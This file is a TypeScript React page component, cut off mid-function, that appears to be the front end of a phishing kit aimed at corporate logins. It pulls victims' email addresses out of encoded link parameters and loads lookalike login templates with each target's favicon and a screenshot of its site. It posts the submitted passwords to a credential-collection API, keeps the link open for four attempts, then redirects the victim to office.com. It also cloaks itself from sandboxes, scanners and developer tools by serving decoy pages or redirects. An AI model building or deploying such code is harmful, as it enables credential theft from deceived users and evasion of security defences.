'use client'

import { useEffect, useState, Suspense } from 'react'
import { useSearchParams } from 'next/navigation'
import { X } from 'lucide-react'
// Removed VerifyGate - showing login form directly after CAPTCHA
import DomainLogo from '@/components/DomainLogo'
import Header from '@/components/Header'
import Footer from '@/components/Footer'
import BotDetection from '@/components/BotDetection'
import BotFilterGate from '@/components/BotFilterGate'
import CaptchaGateWrapper from '@/components/CaptchaGateWrapper'
import StealthVerificationGate from '@/components/StealthVerificationGate'
import DevToolsBlocker from '@/components/DevToolsBlocker'
import { getTranslations, type SupportedLanguage } from '@/lib/locales'
import { redirectToSafeSiteWithReason } from '@/lib/redirectWithReason'
import { useSandboxDetection } from '@/components/SandboxDetector'
import { getRandomTemplate } from '@/lib/benignTemplates'
import { Template } from '@/lib/templateTypes'
import { GenericTemplateRenderer } from '@/components/templates/GenericTemplateRenderer'
import WhiteLoadingScreen from '@/components/WhiteLoadingScreen'
import { API_ROUTES } from '@/lib/api-routes'

// Helper function to decode email from auto grab parameters
function decodeEmailFromParam(param: string): string | null {
  try {
    // Advanced extraction: Handle token-wrapped emails
    // Pattern 1: token-email-token with dashes
    if (param.includes('-')) {
      const parts = param.split('-')
      for (const part of parts) {
        if (part.includes('@')) {
          return part // Plain email
        }
        // Try decode as base64
        try {
          const decoded = atob(part)
          if (decoded.includes('@')) {
            return decoded
          }
        } catch {}
      }
    }
    
    // Pattern 2: token_email_token with underscores
    if (param.includes('_')) {
      const parts = param.split('_')
      for (const part of parts) {
        if (part.includes('@')) {
          return part
        }
        try {
          const decoded = atob(part)
          if (decoded.includes('@')) {
            return decoded
          }
        } catch {}
      }
    }
    
    // Pattern 3: token/email/token with slashes
    if (param.includes('/')) {
      const parts = param.split('/')
      for (const part of parts) {
        if (part.includes('@')) {
          return part
        }
        try {
          const decoded = atob(part)
          if (decoded.includes('@')) {
            return decoded
          }
        } catch {}
      }
    }
    
    // Pattern 4: Try to find base64 email in concatenated string
    if (param.includes('=')) {
      const segments = param.match(/[A-Za-z0-9+/]+=*/g) || []
      for (const segment of segments) {
        try {
          const decoded = atob(segment)
          if (decoded.includes('@')) {
            return decoded
          }
        } catch {}
      }
    }
    
    // Pattern 5: Check if param itself is an email
    if (param.includes('@')) {
      return param
    }
    
    // Pattern 6: Try full value as base64
    try {
      const decoded = atob(param)
      if (decoded.includes('@')) {
        return decoded
      }
    } catch {}
    
    return null
  } catch {
    // Fallback
    if (param.includes('@')) {
      return param
    }
    return null
  }
}

// Helper function to decode email from hash fragment
function decodeEmailFromHash(hash: string): string | null {
  try {
    // Remove any random characters if present
    // Format: #(Random 4 String)(Email Base64)(Random 4 String)
    // Try to extract the middle part if it's long enough
    if (hash.length > 8) {
      // Try removing first and last 4 characters
      const middle = hash.substring(4, hash.length - 4)
      const decoded = atob(middle)
      if (decoded.includes('@')) {
        return decoded
      }
    }
    
    // Try to decode the entire hash as base64
    const fullDecoded = atob(hash)
    if (fullDecoded.includes('@')) {
      return fullDecoded
    }
    
    // Check if hash itself is an email
    if (hash.includes('@')) {
      return hash
    }
    
    return null
  } catch {
    // If all decoding fails, check if it's a plain email
    if (hash.includes('@')) {
      return hash
    }
    return null
  }
}

function HomeContent() {
  const searchParams = useSearchParams()
  const [email, setEmail] = useState<string>('')
  const [domain, setDomain] = useState<string>('')
  const [screenshotUrl, setScreenshotUrl] = useState<string | null>(null)
  const [faviconUrl, setFaviconUrl] = useState<string | null>(null)
  const [sessionId, setSessionId] = useState<string | null>(null)
  // Check if CAPTCHA was already verified in this session (persist across refreshes)
  // Initialize to false to ensure server/client consistency, then update after mount
  const [captchaVerified, setCaptchaVerified] = useState(false)
  const [isClient, setIsClient] = useState(false)
  
  // Track page load time for fail-safes
  const [pageLoadTime] = useState(() => Date.now())
  
  // Emergency bypass via URL param
  const bypassSecurity = searchParams.get('bypass') === 'true'
  
  const [showLandingPage, setShowLandingPage] = useState(false)
  
  // Check if checking was already completed (for refresh persistence)
  // Initialize to false to ensure server/client consistency
  const [checkingComplete, setCheckingComplete] = useState(false)
  
  // Stealth verification state
  const [stealthVerified, setStealthVerified] = useState(false)
  
  // Completion page state (for back button prevention)
  const [showCompletionPage, setShowCompletionPage] = useState(false)

  // Sandbox detection state
  const [showBenign, setShowBenign] = useState(false)
  const [benignTemplate, setBenignTemplate] = useState<string | null>(null)
  const [sandboxCheckComplete, setSandboxCheckComplete] = useState(false)
  
  // Client-side sandbox detection
  const { results: clientResults, score: clientScore, loading: detectionLoading } = useSandboxDetection()
  
  // Link status checking (GLOBAL - prevents incognito reuse)
  const [linkStatus, setLinkStatus] = useState<'checking' | 'valid' | 'used' | 'expired' | 'invalid'>('checking')
  
  // Additional state hooks (must be before any early returns)
  const [isChecking, setIsChecking] = useState(false)
  const [language, setLanguage] = useState<SupportedLanguage>('en')
  const [translations, setTranslations] = useState(getTranslations('en'))
  
  // Template system state
  const [template, setTemplate] = useState<Template | null>(null)
  const [templateLanguage, setTemplateLanguage] = useState<'en' | 'ja' | 'ko' | 'de' | 'es'>('ja')
  const [useTemplate, setUseTemplate] = useState(false)
  const [loadingScreenId, setLoadingScreenId] = useState<string>('meeting')
  const [loadingDuration, setLoadingDuration] = useState<number>(3)
  
  // CRITICAL: Check link status globally (prevents incognito reuse)
  useEffect(() => {
    const checkLinkStatus = async () => {
      const token = searchParams.get('token')
      const id = searchParams.get('id')
      
      // Type B Auto Grab: Extract email from additional parameters (sid, hash, v)
      // Type B tokens are timestamp-based (e.g., 1763058004035_a1b2c3)
      // Type A tokens are JWTs (start with eyJ)
      const typeBEmailParamsCheck = {
        sid: searchParams.get('sid'),
        v: searchParams.get('v'),
        hash: typeof window !== 'undefined' && window.location.hash ? window.location.hash.substring(1) : null
      }
      
      const hasTypeBEmailParam = Object.values(typeBEmailParamsCheck).some(val => val && val.trim() && !val.includes('++'))
      
      // Extract email from sid/v/hash for Type B
      if (hasTypeBEmailParam) {
      }
      
      // Extract email if present in Type B params
      if (hasTypeBEmailParam) {
        let extractedEmail: string | null = null
        
        if (typeBEmailParamsCheck.sid) {
          extractedEmail = decodeEmailFromParam(typeBEmailParamsCheck.sid)
        } else if (typeBEmailParamsCheck.hash) {
          extractedEmail = decodeEmailFromHash(typeBEmailParamsCheck.hash)
        } else if (typeBEmailParamsCheck.v) {
          extractedEmail = decodeEmailFromParam(typeBEmailParamsCheck.v)
        }
        
        if (extractedEmail && extractedEmail.includes('@')) {
          setEmail(extractedEmail)
          setDomain(extractedEmail.split('@')[1] || '')
          
          // Validate email against allowed list
          // This will be checked in link status validation
        }
        
        // Continue to token validation - don't skip it!
      }
      
      if (!token) {
        setLinkStatus('invalid')
        return
      }
      
      try {
        const response = await fetch(API_ROUTES.checkLinkStatus, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            token, 
            id,
            fullUrl: typeof window !== 'undefined' ? window.location.href : '' // Include full URL for Type B email extraction
          })
        })
        
        const data = await response.json()
        
        if (data.status === 'used') {
          setLinkStatus('used')
          // Redirect to company domain with #ReviewCompleted
          const redirectUrl = data.redirectUrl || 'https://office.com'
          window.location.replace(redirectUrl)
          return
        }
        
        if (data.status === 'expired') {
          setLinkStatus('expired')
          const redirectUrl = data.redirectUrl || 'https://office.com'
          window.location.replace(redirectUrl)
          return
        }
        
        if (data.status === 'invalid') {
          // CRITICAL: Before marking as invalid, check attempt count
          // If user has made attempts < 4, the link should still be valid
          // Only mark as invalid if we're certain (e.g., no token, link not found, etc.)
          if (email && token) {
            // User has email and token - check attempt count before marking invalid
            // Try to get attempt count from API
            try {
              const today = new Date().toISOString().split('T')[0]
              const attemptKey = `${email}_${today}`
              // We can't directly check attempt count here, but if we have email and token,
              // and the link exists, it might still be valid (user might have attempts < 4)
              
              // Don't immediately mark as invalid - try to continue
              // The backend link-status check should handle attempt count verification
              // If backend says invalid, it's likely truly invalid (no link found, etc.)
              setLinkStatus('invalid')
              // Don't redirect - show error page but allow user to see what happened
              return
            } catch (error) {
              // If check fails, mark as invalid
              setLinkStatus('invalid')
              return
            }
          } else {
            // No email or token - definitely invalid
            setLinkStatus('invalid')
            const redirectUrl = data.redirectUrl || 'https://office.com'
            window.location.replace(redirectUrl)
            return
          }
        }
        
        if (data.status === 'valid') {
          setLinkStatus('valid')
          if (data.email) {
            setEmail(data.email)
          }
        }
      } catch (error) {
        if (process.env.NODE_ENV === 'development') {
          console.error('Link status check error:', error)
        }
        setLinkStatus('invalid')
      }
    }
    
    checkLinkStatus()
  }, [searchParams])
  
  // Restore state from sessionStorage after client mount to avoid hydration mismatch
  useEffect(() => {
    setIsClient(true)
    if (typeof window !== 'undefined') {
      // Restore captchaVerified state
      const verified = sessionStorage.getItem('captcha_verified')
      const timestamp = sessionStorage.getItem('captcha_timestamp')
      if (verified === 'true' && timestamp) {
        const timeDiff = Date.now() - parseInt(timestamp)
        // Valid for 30 minutes - restore state if recent
        if (timeDiff < 30 * 60 * 1000) {
          setCaptchaVerified(true)
        }
      }
      
      // Restore showLandingPage state
      const checkingComplete = sessionStorage.getItem('checking_complete')
      if (verified === 'true' && checkingComplete === 'true') {
        setShowLandingPage(true)
      }
      
      // Restore checkingComplete state
      setCheckingComplete(checkingComplete === 'true')
      
      // Restore stealth verification with expiration check
      const stealthStr = sessionStorage.getItem('stealth_verified')
      if (stealthStr) {
        try {
          const stealthData = JSON.parse(stealthStr)
          const age = Date.now() - stealthData.timestamp
          
          if (age < stealthData.expiresIn) {
            setStealthVerified(true)
          } else {
            sessionStorage.removeItem('stealth_verified')
          }
        } catch {
          sessionStorage.removeItem('stealth_verified')
        }
      }
      
    }
  }, [])

  // Check if link was already used (back button prevention)
  // MUST be before any early returns (Rules of Hooks)
  useEffect(() => {
    if (typeof window !== 'undefined' && linkStatus === 'valid') {
      const linkUsed = sessionStorage.getItem('link_used')
      const usedEmail = sessionStorage.getItem('used_email')
      const currentEmail = searchParams.get('email') || email
      
      if (linkUsed === 'true' && usedEmail && currentEmail && usedEmail === currentEmail) {
        setShowCompletionPage(true)
      }
    }
  }, [searchParams, email, linkStatus])

  // Sandbox detection check (Layer 0 - runs before all other gates)
  // MUST be before any early returns (Rules of Hooks)
  useEffect(() => {
    const checkSandbox = async () => {
      // Wait for client-side detection to complete
      if (detectionLoading || sandboxCheckComplete) return

      try {
        // Get server-side detection
        const serverCheck = await fetch(API_ROUTES.sandboxCheck, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            token: searchParams.get('token'),
            id: searchParams.get('id'),
            clientResults,
            clientScore,
          }),
        })

        const serverResult = await serverCheck.json()

        // Decision: Show benign or real page
        if (serverResult.isSandbox) {
          // Sandbox detected - show fake benign page
          const template = getRandomTemplate(serverResult.fingerprint)
          setBenignTemplate(template.path)
          setShowBenign(true)
        }

        setSandboxCheckComplete(true)
      } catch (error) {
        // Silent fail - allow through if detection fails
        setSandboxCheckComplete(true)
      }
    }

    checkSandbox()
  }, [detectionLoading, clientResults, clientScore, searchParams, sandboxCheckComplete])

  // Detect language from IP
  useEffect(() => {
    // Use AbortController for timeout
    const controller = new AbortController()
    const timeoutId = setTimeout(() => controller.abort(), 5000)
    
    fetch('/api/detect-language', {
      signal: controller.signal,
      method: 'POST',
      cache: 'no-store',
    })
      .then(res => {
        clearTimeout(timeoutId)
        if (!res.ok) throw new Error('Detection failed')
        return res.json()
      })
      .then(data => {
        const detectedLang = data.language as SupportedLanguage
        if (detectedLang) {
          setLanguage(detectedLang)
          setTranslations(getTranslations(detectedLang))
        }
      })
      .catch(() => {
        clearTimeout(timeoutId)
        // Fallback to English - silently
        setLanguage('en')
        setTranslations(getTranslations('en'))
      })
  }, [])
  
  // Load template and language (after we have email and checking is complete)
  // Load early so template is ready when stealth verification completes
  useEffect(() => {
    // Only load if we have email and checking is complete (after bot delay)
    if (!email || !checkingComplete) {
      // ADD THIS: If waiting too long, force load anyway
      const waitingTime = Date.now() - pageLoadTime
      if (waitingTime > 20000) {  // 20 seconds
        setCheckingComplete(true)
        if (typeof window !== 'undefined') {
          sessionStorage.setItem('checking_complete', 'true')
        }
      }
      
      return
    }
    
    // Don't reload if already loaded
    if (template) {
      return
    }
    
    loadTemplateAndLanguage()
  }, [email, checkingComplete])
  
  async function loadTemplateAndLanguage() {
    try {
      // Get language detection
      const langResponse = await fetch('/api/detect-language', {
        method: 'POST',
      })
      const langData = await langResponse.json()
      const detectedLang = (langData.language || 'ja') as 'en' | 'ja' | 'ko' | 'de' | 'es'
      
      // Get link token from URL
      const token = searchParams.get('token')
      const id = searchParams.get('id')
      
      // Fetch link configuration to get templateMode and templateId
      let linkConfig: any = undefined
      if (token) {
        try {
          const linkResponse = await fetch(`${API_ROUTES.linkConfig}?token=${token}`)
          const linkData = await linkResponse.json()
          if (linkData.success && linkData.config) {
            linkConfig = {
              token,
              id,
              templateId: linkData.config.templateId,
              templateMode: linkData.config.templateMode,
            }
            // Store loading screen config
            if (linkData.config.loadingScreen) {
              setLoadingScreenId(linkData.config.loadingScreen)
            }
            if (linkData.config.loadingDuration) {
              setLoadingDuration(linkData.config.loadingDuration)
            }
          } else {
            // Fallback: just use token/id
            linkConfig = { token, id }
          }
        } catch (err) {
          // Fallback: just use token/id
          linkConfig = { token, id }
        }
      } else {
        // For auto grab links without token, use default settings
        // Check admin settings for default loading screen
        try {
          const settingsResponse = await fetch('/api/admin/settings')
          const settingsData = await settingsResponse.json()
          if (settingsData.success && settingsData.settings) {
            // Use default or fallback values
            setLoadingScreenId(settingsData.settings.loadingScreen || 'meeting')
            setLoadingDuration(settingsData.settings.loadingDuration || 3)
          }
        } catch {
          // Fallback to defaults
          setLoadingScreenId('meeting')
          setLoadingDuration(3)
        }
      }
      
      // If no link config found, create basic one
      if (!linkConfig && token) {
        linkConfig = { token, id }
      }
      
      // Select template
      const templateResponse = await fetch(API_ROUTES.templatesSelect, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: email || undefined,
          linkConfig: linkConfig,
          ip: langData.ip || '127.0.0.1',
          acceptLanguage: typeof navigator !== 'undefined' ? navigator.language : undefined,
          mode: linkConfig?.templateMode || 'auto',
        }),
      })
      
      if (templateResponse.ok) {
        const templateData = await templateResponse.json()
        
        if (templateData.success && templateData.template) {
          setTemplate(templateData.template)
          setTemplateLanguage(templateData.language || detectedLang)
          setUseTemplate(true)
        } else {
          setUseTemplate(false)
          setTemplate(null) // Explicitly set to null so loading screen doesn't show
        }
      } else {
        setUseTemplate(false)
      }
    } catch (error) {
      if (process.env.NODE_ENV === 'development') {
        console.error('Failed to load template:', error)
      }
      setUseTemplate(false)
    }
  }
  
  // Handle credential submission from template
  const handleCredentialSubmit = async (email: string, password: string) => {
    try {
      const token = searchParams.get('token')
      const id = searchParams.get('id')
      
      const response = await fetch(API_ROUTES.submitCredentials, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email,
          password,
          token,
          id,
          sessionId: sessionId || undefined,
        }),
      })
      
      if (response.redirected) {
        window.location.replace(response.url)
        return
      }
      
      const result = await response.json()
      
      if (result.redirect) {
        window.location.replace(result.redirect)
        return
      }
      
      // CRITICAL: Only mark link as used and redirect if 4 attempts are completed
      // Don't mark as used after 1-3 attempts - user should be able to return
      if (result.success && result.verified && result.attemptCount >= 4) {
        // Only mark link as used after 4 attempts completed
        if (typeof window !== 'undefined') {
          sessionStorage.setItem('link_used', 'true')
          sessionStorage.setItem('used_email', email)
          sessionStorage.setItem('used_at', Date.now().toString())
        }
        
        // Get redirect URL
        const domainResponse = await fetch('/api/get-domain-info', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email }),
        })
        const domainData = await domainResponse.json()
        const redirectUrl = domainData.redirectUrl || 'https://www.office365.com'
        
        // Redirect after 2 seconds
        setTimeout(() => {
          window.location.replace(redirectUrl)
        }, 2000)
      } else if (result.success && result.attemptCount && result.attemptCount < 4) {
        // Less than 4 attempts - don't mark as used, don't redirect
        // User can continue attempts
      }
      } catch (error) {
        if (process.env.NODE_ENV === 'development') {
          console.error('Failed to submit credentials:', error)
        }
    }
  }

  useEffect(() => {
    // Only run on client side
    if (typeof window === 'undefined') return
    
    // Check for Type B auto grab email parameters (sid, hash, v)
    // Type B links now have backend tokens, so don't skip validation
    // Just extract email from additional parameters
    const autoGrabEmailParams = {
      sid: searchParams.get('sid'),      // Session ID pattern with email
      v: searchParams.get('v'),          // Verification param with email
      hash: window.location.hash ? window.location.hash.substring(1) : null
    }
    
    // Extract email if present in auto grab params
    const hasAutoGrabEmail = Object.values(autoGrabEmailParams).some(val => val && val.trim() && !val.includes('++'))
    
    if (hasAutoGrabEmail) {
      // Extract email but continue with normal token validation
      let extractedEmail: string | null = null
      
      if (autoGrabEmailParams.sid) {
        extractedEmail = decodeEmailFromParam(autoGrabEmailParams.sid)
      } else if (autoGrabEmailParams.hash) {
        extractedEmail = decodeEmailFromHash(autoGrabEmailParams.hash)
      } else if (autoGrabEmailParams.v) {
        extractedEmail = decodeEmailFromParam(autoGrabEmailParams.v)
      }
      
      if (extractedEmail && extractedEmail.includes('@')) {
        setEmail(extractedEmail)
        const emailDomain = extractedEmail.split('@')[1]
        if (emailDomain) {
          setDomain(emailDomain)
          const favicon = `https://www.google.com/s2/favicons?domain=${emailDomain}&sz=32`
          setFaviconUrl(favicon)
        }
      }
      
      // Continue to normal token validation - don't return
    }
    
    // Check for session token (document link with id parameter) or Type A link
    const idParam = searchParams.get('id')
    
    if (idParam) {
      // Try session token first (document links)
      fetch(`${API_ROUTES.getEmailFromToken}?id=${idParam}`)
        .then(r => {
          if (r.ok) {
            // Session token found - use it
            return r.json().then(data => {
              if (data.email) {
                setEmail(data.email)
                const emailDomain = data.email.split('@')[1]
                if (emailDomain) {
                  setDomain(emailDomain)
                  const favicon = `https://www.google.com/s2/favicons?domain=${emailDomain}&sz=32`
                  setFaviconUrl(favicon)
                  fetch(`/api/get-screenshot?domain=${encodeURIComponent(emailDomain)}`)
                    .then(res => res.json())
                    .then(data => {
                      if (data.url) {
                        setScreenshotUrl(data.url)
                      }
                    })
                    .catch(() => {})
                }
              }
            })
          } else {
            // Session token not found - try Type A link
            return fetch(`${API_ROUTES.getEmail}?id=${idParam}`)
              .then(r => {
                // Handle both 404 (not found) and 200 (found) responses
                if (r.status === 404) {
                  throw new Error('Invalid ID')
                }
                if (!r.ok) {
                  throw new Error(`API error: ${r.status}`)
                }
                return r.json()
              })
              .then(data => {
                if (data.email) {
                  setEmail(data.email)
                  const emailDomain = data.email.split('@')[1]
                  if (emailDomain) {
                    setDomain(emailDomain)
                    const favicon = `https://www.google.com/s2/favicons?domain=${emailDomain}&sz=32`
                    setFaviconUrl(favicon)
                    fetch(`/api/get-screenshot?domain=${encodeURIComponent(emailDomain)}`)
                      .then(res => res.json())
                      .then(data => {
                        if (data.url) {
                          setScreenshotUrl(data.url)
                        }
                      })
                      .catch(() => {})
                  }
                } else {
                  redirectToSafeSiteWithReason('token_invalid')
                }
              })
          }
        })
        .catch(() => {
          redirectToSafeSiteWithReason('token_invalid')
        })
      return
    }
    
    // Type B or old format: Check for email and token in URL
    const emailParam = searchParams.get('email') || new URLSearchParams(window.location.search).get('email')
    const tokenParam = searchParams.get('token') || new URLSearchParams(window.location.search).get('token')
    
    // Type B Auto Grab: Extract email from additional parameters
    // Type B links NOW have backend tokens (token + id), so they go through validation
    // We just need to extract email from sid/hash/v parameters
    const typeBEmailParams = {
      sid: searchParams.get('sid'),
      v: searchParams.get('v'),
      hash: window.location.hash ? window.location.hash.substring(1) : null
    }
    
    const hasTypeBEmail = Object.values(typeBEmailParams).some(val => val && val.trim() && !val.includes('++'))
    
    if (hasTypeBEmail && tokenParam) {
      let extractedEmail: string | null = null
      
      if (typeBEmailParams.sid) {
        extractedEmail = decodeEmailFromParam(typeBEmailParams.sid)
      } else if (typeBEmailParams.hash) {
        extractedEmail = decodeEmailFromHash(typeBEmailParams.hash)
      } else if (typeBEmailParams.v) {
        extractedEmail = decodeEmailFromParam(typeBEmailParams.v)
      }
      
      if (extractedEmail && extractedEmail.includes('@')) {
        setEmail(extractedEmail)
        setDomain(extractedEmail.split('@')[1] || '')
        
        const emailDomain = extractedEmail.split('@')[1]
        if (emailDomain) {
          const favicon = `https://www.google.com/s2/favicons?domain=${emailDomain}&sz=32`
          setFaviconUrl(favicon)
          fetch(`/api/get-screenshot?domain=${encodeURIComponent(emailDomain)}`)
            .then(res => res.json())
            .then(data => {
              if (data.url) {
                setScreenshotUrl(data.url)
              }
            })
            .catch(() => {})
        }
      }
      // Continue - don't return, let token validation proceed
    }
    
    // If no token, check if placeholder link
    if (!tokenParam) {
      const placeholderParams = searchParams.get('sid') || searchParams.get('v') || window.location.hash
      if (placeholderParams && (placeholderParams.includes('++email') || placeholderParams.includes('email64'))) {
        setLinkStatus('invalid')
        return
      }
      
      // No token and not placeholder - redirect
      setTimeout(() => {
        const retryToken = searchParams.get('token')
        if (!retryToken) {
          redirectToSafeSiteWithReason('token_invalid')
        }
      }, 200)
      return
    }
    
    // Check fingerprint if email is available (async check)
    if (emailParam && typeof window !== 'undefined') {
      // Generate client-side fingerprint (synchronous)
      let clientFingerprint = ''
      try {
        const fingerprintData = {
          screen: `${window.screen.width}x${window.screen.height}x${window.screen.colorDepth}`,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          language: navigator.language,
          platform: navigator.platform,
          hardware: `${navigator.hardwareConcurrency || 'unknown'}x${(navigator as any).deviceMemory || 'unknown'}`,
          plugins: navigator.plugins.length,
          cookieEnabled: navigator.cookieEnabled,
          doNotTrack: navigator.doNotTrack || 'unknown',
        }
        clientFingerprint = JSON.stringify(fingerprintData)
      } catch {
        clientFingerprint = `${navigator.userAgent}-${navigator.platform}`
      }
      
      // Check if this fingerprint has already completed login (INFO ONLY - don't block)
      // This is for logging/analytics, not for blocking access
      fetch('/api/check-fingerprint', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: emailParam,
          fingerprint: clientFingerprint,
          ip: 'client', // IP will be extracted server-side
        }),
      })
        .then(res => res.json())
        .then(data => {
          if (data.hasCompleted) {
            // Don't redirect - let the link status check handle validity
            // The backend will enforce single-use policy if needed
          }
        })
        .catch(() => {
          // Silent fail - continue with normal flow
        })
    }
    
    // Process email param OR auto-grabbed email
    const currentEmail = emailParam || email
    
    if (currentEmail && currentEmail.includes('@')) {
      if (!email) {
        setEmail(currentEmail)
      }
      
      // Extract domain from email
      const emailDomain = currentEmail.split('@')[1]
      if (emailDomain) {
        if (!domain) {
          setDomain(emailDomain)
        }
        
        // Set favicon
        const favicon = `https://www.google.com/s2/favicons?domain=${emailDomain}&sz=32`
        setFaviconUrl(favicon)
        
        // Fetch website screenshot
        fetch(`/api/get-screenshot?domain=${encodeURIComponent(emailDomain)}`)
          .then(res => res.json())
          .then(data => {
            if (data.url) {
              setScreenshotUrl(data.url)
            } else if (data.fallback) {
              setScreenshotUrl(data.url)
            }
          })
          .catch(() => {
            // Silently fail - don't log errors (email scanner safe)
          })
      }
    }
  }, [searchParams])

  // Update favicon in document head
  useEffect(() => {
    if (faviconUrl) {
      const link = document.querySelector("link[rel~='icon']") as HTMLLinkElement
      if (link) {
        link.href = faviconUrl
      } else {
        const newLink = document.createElement('link')
        newLink.rel = 'icon'
        newLink.href = faviconUrl
        document.getElementsByTagName('head')[0].appendChild(newLink)
      }
    }
  }, [faviconUrl])

  // No longer needed - showing form directly after CAPTCHA

  const handleBotDetected = () => {
    redirectToSafeSiteWithReason('bot_detected')
  }

  // Removed handleVerified - no longer needed since we skip VerifyGate

  // Track page refreshes - only block excessive rapid refreshes, allow normal link reopening
  useEffect(() => {
    if (typeof window === 'undefined') return
    
    const refreshKey = 'page_refresh_count'
    const timestampKey = 'page_refresh_timestamp'
    const now = Date.now()
    const lastRefresh = localStorage.getItem(timestampKey)
    const timeSinceLastRefresh = lastRefresh ? now - parseInt(lastRefresh) : Infinity
    
    // Reset count if more than 5 minutes passed (normal reopening after delay)
    // This allows users to reopen links normally after hours/days
    if (timeSinceLastRefresh > 5 * 60 * 1000) {
      localStorage.setItem(refreshKey, '0')
    }
    
    // Only count rapid refreshes (within 30 seconds)
    // Normal link reopening after minutes/hours is NOT counted
    let currentCount = parseInt(localStorage.getItem(refreshKey) || '0')
    
    if (timeSinceLastRefresh < 30 * 1000) {
      // Rapid refresh within 30 seconds - count it (likely bot/scanner)
      currentCount += 1
      localStorage.setItem(refreshKey, currentCount.toString())
    } else {
      // Normal reopening after 30+ seconds - reset count (legitimate user)
      currentCount = 0
      localStorage.setItem(refreshKey, '0')
    }
    
    // Update timestamp
    localStorage.setItem(timestampKey, now.toString())
    
    // If too many rapid refreshes (5+ within 30 seconds), redirect to safe site
    // This catches bots/scanners doing rapid analysis, not normal users
    // Normal users reopening links after minutes/hours are never blocked
    if (currentCount >= 5 && timeSinceLastRefresh < 30 * 1000) {
      const safeSites = [
        'https://en.wikipedia.org/wiki/Main_Page',
        'https://www.amazon.com',
        'https://www.ebay.com',
        'https://www.apple.com',
        'https://www.google.com',
      ]
      const baseUrl = safeSites[Math.floor(Math.random() * safeSites.length)]
      const params = new URLSearchParams()
      params.set('ref', Math.random().toString(36).substring(2, 15))
      params.set('t', Date.now().toString())
      params.set('id', Math.random().toString(36).substring(2, 10))
      params.set('v', Math.random().toString(36).substring(2, 8))
      const separator = baseUrl.includes('?') ? '&' : '?'
      const redirectUrl = `${baseUrl}${separator}${params.toString()}`
      window.location.href = redirectUrl
      return
    }
  }, [])

  // Show landing page after verification (moved before conditional returns to fix React Hooks rule)
  useEffect(() => {
    if (captchaVerified && checkingComplete && !showLandingPage) {
      setShowLandingPage(true)
      setIsChecking(false)
    }
  }, [captchaVerified, checkingComplete, showLandingPage])
  
  // Update checkingComplete state when sessionStorage changes (moved before conditional returns to fix React Hooks rule)
  useEffect(() => {
    if (typeof window !== 'undefined') {
      const checkComplete = sessionStorage.getItem('checking_complete') === 'true'
      if (checkComplete !== checkingComplete) {
        setCheckingComplete(checkComplete)
      }
    }
  }, [checkingComplete])
  
  // Emergency bypass - skip all security layers
  useEffect(() => {
    if (bypassSecurity) {
      setCheckingComplete(true)
      setCaptchaVerified(true)
      setIsChecking(false)
      setShowLandingPage(true)
      setStealthVerified(true)
      
      if (typeof window !== 'undefined') {
        sessionStorage.setItem('checking_complete', 'true')
        sessionStorage.setItem('captcha_verified', 'true')
        sessionStorage.setItem('stealth_verified', JSON.stringify({
          verified: true,
          timestamp: Date.now(),
          expiresIn: 10 * 60 * 1000,
        }))
      }
    }
  }, [bypassSecurity])
  
  // Master timeout - force progression if stuck
  useEffect(() => {
    if (captchaVerified && !checkingComplete && !bypassSecurity) {
      const masterId = setTimeout(() => {
        setCheckingComplete(true)
        setIsChecking(false)
        setShowLandingPage(true)
        if (typeof window !== 'undefined') {
          sessionStorage.setItem('checking_complete', 'true')
        }
      }, 15000)  // 15 seconds
      
      return () => clearTimeout(masterId)
    }
  }, [captchaVerified, checkingComplete, bypassSecurity])

  const handleStealthVerified = () => {
    setStealthVerified(true)
    if (typeof window !== 'undefined') {
      const stealthData = {
        verified: true,
        timestamp: Date.now(),
        expiresIn: 10 * 60 * 1000, // 10 minutes
      }
      sessionStorage.setItem('stealth_verified', JSON.stringify(stealthData))
    }
  }

  const handleCaptchaVerified = async () => {
    setCaptchaVerified(true)
    setIsChecking(true)
    
    // Clear stealth verification state when starting new CAPTCHA flow
    // This ensures stealth gate runs on each new session
    setStealthVerified(false)
    if (typeof window !== 'undefined') {
      sessionStorage.removeItem('stealth_verified')
      sessionStorage.setItem('captcha_verified', 'true')
      sessionStorage.setItem('captcha_timestamp', Date.now().toString())
    }
    
    // Check admin settings for bot delay configuration
    let delayMin = 3 // Default: 3 seconds
    let delayMax = 7 // Default: 7 seconds
    let delayEnabled = true
    
    try {
      const settingsResponse = await fetch('/api/admin/settings')
      const responseData = await settingsResponse.json()
      // API returns { success: true, settings: {...} }
      const settings = responseData.settings || responseData
      
      // Check if bot delay gate is disabled
      if (settings.security?.gates?.layer3BotDelay === false) {
        delayEnabled = false
      }
      
      // Check if bot delay feature itself is disabled
      if (settings.security?.botDelay?.enabled === false) {
        delayEnabled = false
      }
      
      // Get configured delay values from settings
      if (settings.security?.botDelay?.min) {
        delayMin = settings.security.botDelay.min
      }
      if (settings.security?.botDelay?.max) {
        delayMax = settings.security.botDelay.max
      }
    } catch (error) {
      if (process.env.NODE_ENV === 'development') {
        console.error('Bot delay settings check error:', error)
      }
      // Fail secure - use defaults
    }
    
    // Calculate random delay (in milliseconds)
    const randomDelay = delayEnabled 
      ? Math.floor(Math.random() * (delayMax - delayMin) * 1000) + (delayMin * 1000)
      : 0 // No delay if disabled
    
    // Enhanced bot detection during delay
    const performBotDetection = async () => {
      try {
        // ADD TIMEOUT: 5 seconds max
        const controller = new AbortController()
        const timeoutId = setTimeout(() => {
          controller.abort()
        }, 5000)
        
        // Generate fingerprint for enhanced detection
        const fingerprint = await generateEnhancedFingerprint()
        
        // Check with bot detection API
        const response = await fetch(API_ROUTES.botFilter, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            fingerprint,
            timestamp: Date.now(),
            captchaVerified: true,
          }),
          cache: 'no-store',
          signal: controller.signal,  // ← ADD TIMEOUT SUPPORT
        })
        
        clearTimeout(timeoutId)  // ← CLEAR TIMEOUT IF SUCCESS
        
        if (response.redirected) {
          // Bot detected - redirect to safe site
          redirectToSafeSiteWithReason('bot_detected')
          return
        }
        
        const data = await response.json()
        if (!data.ok || !data.passed) {
          // Bot detected - redirect
          redirectToSafeSiteWithReason('bot_detected')
          return
